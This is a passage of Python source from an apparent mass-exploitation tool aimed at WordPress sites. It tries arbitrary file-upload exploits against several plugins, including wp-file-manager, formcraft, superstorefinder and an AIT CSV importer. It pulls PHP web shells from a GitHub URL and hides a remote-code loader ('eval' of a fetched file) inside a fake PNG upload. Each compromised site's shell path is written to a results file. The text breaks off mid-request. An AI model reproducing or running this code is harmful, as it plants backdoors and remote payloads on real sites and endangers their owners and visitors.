            ckme = requests.get(url + '/'+izo,headers=Headers,timeout=15)
            if "SEA-GHOST" in ckme.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day adning Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/'+izo+'\n')

            elif "SEA-GHOST" in requests.get(url + '/wp-content/uploads/2020/12/'+izo,headers=Headers,timeout=15).text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day adning Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/wp-content/uploads/2020/12/'+izo+'\n')
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln adning ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln Adning ]'+la7mar+ '\n')
            pass
        try:

            caso = self.ran(10) + '.csv.php',self.ran(10) + '.csv.PhP',self.ran(10) + '.csv.php.TxT'
            #caso = "index.html","index.htm"
            for izo in caso:
                s = requests.Session()
                shell_content = s.get("https://raw.githubusercontent.com/izx2023/z/main/14.php")
                r = s.post(url+"/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php",files={"default_location":(izo,shell_content.text.encode(), "text/csv")})
                Check = s.get(url  + '/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/'+izo, headers=Headers)
                Check2 = s.get(url  + '/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/'+izo, headers=Headers)
                if 'SEA-GHOST' in Check.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [superstorefinder Uploaded Shell]'+ '\n')
                elif 'SEA-GHOST' in Check2.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [superstorefinder Uploaded Shell]'+ '\n')

                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln superstorefinder]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln superstorefinder]'+la7mar+ '\n')
            pass

        try:
            caso = self.ran(10) + '.csv.php',self.ran(10) + '.csv.PhP',self.ran(10) + '.csv.phtml'
            for izo in caso:
                s = requests.Session()
                shell_content = s.get("https://raw.githubusercontent.com/izx2023/z/main/14.php")
                r = s.post(url+"/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/pages/import.php",files={"default_location":(izo,shell_content.text.encode(), "text/csv")})
                Check = s.get(url  + '/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/'+izo, headers=Headers)
                Check2 = s.get(url  + '/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/'+izo, headers=Headers)
                if 'SEA-GHOST' in Check.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [superlogoshowcase Uploaded Shell]'+ '\n')
                elif 'SEA-GHOST' in Check2.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [superlogoshowcase Uploaded Shell]'+ '\n')

                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln superlogoshowcase]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln superlogoshowcase]'+la7mar+ '\n')
            pass           

        try:
            caso = self.ran(10) + '.csv.php',self.ran(10) + '.csv.PhP',self.ran(10) + '.csv.phtml'
            for izo in caso:
                s = requests.Session()
                shell_content = s.get("https://raw.githubusercontent.com/izx2023/z/main/14.php")
                r = s.post(url+"/wp-content/plugins/super-interactive-maps/sim-wp-admin/pages/import.php",files={"default_location":(izo,shell_content.text.encode(), "text/csv")})
                Check = s.get(url  + '/wp-content/plugins/super-interactive-maps/sim-wp-admin/'+izo, headers=Headers)
                Check2 = s.get(url  + '/wp-content/plugins/super-interactive-maps/sim-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/'+izo, headers=Headers)
                if 'SEA-GHOST' in Check.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/super-interactive-maps/sim-wp-admin/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [super-interactive-map Uploaded Shell]'+ '\n')
                elif 'SEA-GHOST' in Check2.text:
                    with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                        writer.write(url  + '/wp-content/plugins/super-interactive-maps/sim-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/'+izo + '\n')
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [super-interactive-map Uploaded Shell]'+ '\n')

                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln super-interactive-maps]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln super-interactive-maps]'+la7mar+ '\n')
            pass
            
        try:

            headers ={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050",
            "Expect": "100-continue",
            "Connection": "close",
            }
            izo = self.ran(10) + '.php'
            data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename="+izo+"\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php @eval(\"?>\".file_get_contents(\"https://raw.githubusercontent.com/izx2023/z/main/14x.php\"));?>\r\n--------------------------66e3ca93281c7050--\r\n"
            getme = requests.post(url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers,data=data,timeout=15)
            if getme.status_code == 200:
                ckme = requests.get(url + '/wp-content/plugins/wp-file-manager/lib/files/'+izo)
                if "SEA-GHOST" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wp-file-manager Uploaded Shell]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(url + '/wp-content/plugins/wp-file-manager/lib/files/'+izo+'?izo=help\n')
                    sys.exit()
                else:
                    print((yellow +'[WP]'+red + url + " +++++++++++++ [wp-file-managerer Failed]"))
                
            else:
                print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager]'+la7mar+ '\n')

        except:
            print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager]'+la7mar+ '\n')
            pass 

        try:

            headers ={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050",
            "Expect": "100-continue",
            "Connection": "close",
            }
            izo = self.ran(10) + '.php'
            data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename="+izo+"\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php @eval(\"?>\".file_get_contents(\"https://raw.githubusercontent.com/izx2023/z/main/14x.php\"));?>\r\n--------------------------66e3ca93281c7050--\r\n"
            getme = requests.post(url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimals.php',headers=headers,data=data,timeout=15)
            if getme.status_code == 200:
                ckme = requests.get(url + '/wp-content/plugins/wp-file-manager/lib/files/'+izo)
                if "SEA-GHOST" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wp-file-manager bypass Uploaded Shell]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(url + '/wp-content/plugins/wp-file-manager/lib/files/'+izo+'?izo=help\n')
                    sys.exit()
                else:
                    print((yellow +'[WP]'+red + url + " +++++++++++++ [wp-file-managerer bypass Failed]"))
                
            else:
                print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager bypass]'+la7mar+ '\n')

        except:
            print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager bypass]'+la7mar+ '\n')
            pass 

        try:
            full_url = url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'

            data = {'cmd': 'upload','target': 'l1_','debug': 1}

            izo = self.ran(10) + '.php'
            files = {'upload[0]': (izo, shell,'text/html')}
            res = requests.post(full_url, data=data, files=files, verify=False)
            resi = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/files/'+izo)
            if "RxR HaCkEr" in resi.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wp-file-manager 2 Uploaded Shell]'+ '\n')
                with open('Vulns/xxxxxxxx.txt', 'a') as writer:
                    writer.write(url+'/wp-content/plugins/wp-file-manager/lib/files/'+izo + '\n')
                    sys.exit()
            else:
                print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager 2]'+la7mar+ '\n')

        except:
            print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager 2]'+la7mar+ '\n')
            pass

        try:
            full_url = url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimals.php'

            data = {'cmd': 'upload','target': 'l1_','debug': 1}

            izo = self.ran(10) + '.php'
            files = {'upload[0]': (izo, shell,'text/html')}
            res = requests.post(full_url, data=data, files=files, verify=False)
            resi = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/files/'+izo)
            if "RxR HaCkEr" in resi.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wp-file-manager 3 Uploaded Shell]'+ '\n')
                with open('Vulns/xxxxxxxx.txt', 'a') as writer:
                    writer.write(url+'/wp-content/plugins/wp-file-manager/lib/files/'+izo + '\n')
                    sys.exit()
            else:
                print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager 3]'+la7mar+ '\n')

        except:
            print(la7mar +'[wp]'+cyan+url+cyan+la7mar +'[Not Vuln wp-file-manager 3]'+la7mar+ '\n')
            pass
        try:

            izo = self.ran(10) + '.php'
            shelle_content = requests.get("https://raw.githubusercontent.com/izx2023/z/main/0.php")
            getme = requests.post(url + '/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php',headers=Headers,files={"file":(izo,shelle_content.text.encode(), "text/html")},timeout=15)
            ckme = requests.get(url + '/wp-content/uploads/'+izo,headers=Headers,timeout=15)
            if "SEA-GHOST" in ckme.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day AIT CSV Import Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/wp-content/uploads/'+izo+'\n')

            elif "SEA-GHOST" in requests.get(url + '/wp-content/uploads/2021/01/'+izo,headers=Headers,timeout=15).text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [0day AIT CSV Import Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/wp-content/uploads/2021/01/'+izo+'\n')
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln AIT CSV Import ]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln AIT CSV Import ]'+la7mar+ '\n')
            pass
            
        try:

            izo = self.ran(10) + '.php'
            data = {'files[]':(izo, shell, 'text/html')}
            getme = requests.post(url + '/wp-content/plugins/formcraft/file-upload/server/php/',headers=Headers,files=data,timeout=15)
            ckme = requests.get(url + '/wp-content/plugins/formcraft/file-upload/server/php/files/'+izo,headers=Headers,timeout=15)
            if "RxR HaCkEr" in ckme.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [formcraft Uploaded Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/wp-content/plugins/formcraft/file-upload/server/php/files/'+izo+'?izo=help\n')

            else:
                izox = self.ran(10) + '.phtml'
                data = {'files[]':(izox, shell, 'text/html')}
                getme = requests.post(url + '/wp-content/plugins/formcraft/file-upload/server/php/',headers=Headers,files=data,timeout=15)
                ckme = requests.get(url + '/wp-content/plugins/formcraft/file-upload/server/php/files/'+izox,headers=Headers,timeout=15)
                if "RxR HaCkEr" in ckme.text:
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [formcraft Uploaded Shell]'+ '\n')
                    open("Vulns/Shells.txt", "a").write(url + '/wp-content/plugins/formcraft/file-upload/server/php/files/'+izox+'\n')

                else:
                    print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln formcraft]'+la7mar+ '\n')

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln formcraft]'+la7mar+ '\n')
            pass    
        try:
        

            #file = ''.join(self.random.sample((string.ascii_uppercase + string.digits), 6))
            file = self.ran(10)



            headersh = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'}
            self.homepage = requests.get(url,headers=headersh,timeout=15)
            self.homepage = self.homepage.text
            self.homepage = self.homepage.split("ajax_nonce\":\"",1)[1]
            self.securitykey = self.homepage[:10]


            self.headersn = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
                            "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
                            "Content-Type": "multipart/form-data; boundary=---------------------------350278735926454076983690555601",
                            }
            self.datad = "-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"supported_type\"\r\n\r\n" \
                "php%\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"size_limit\"\r\n\r\n" \
                "5242880\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n" \
                "dnd_codedropz_upload\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"type" \
                "\"\r\n\r\nclick\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"security\"\r" \
                "\n\r\n" + self.securitykey +"\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"upload-file\"; " \
                "filename=\"" + file +".php%\"\r\nContent-Type: text/plain\r\n\r\n" \
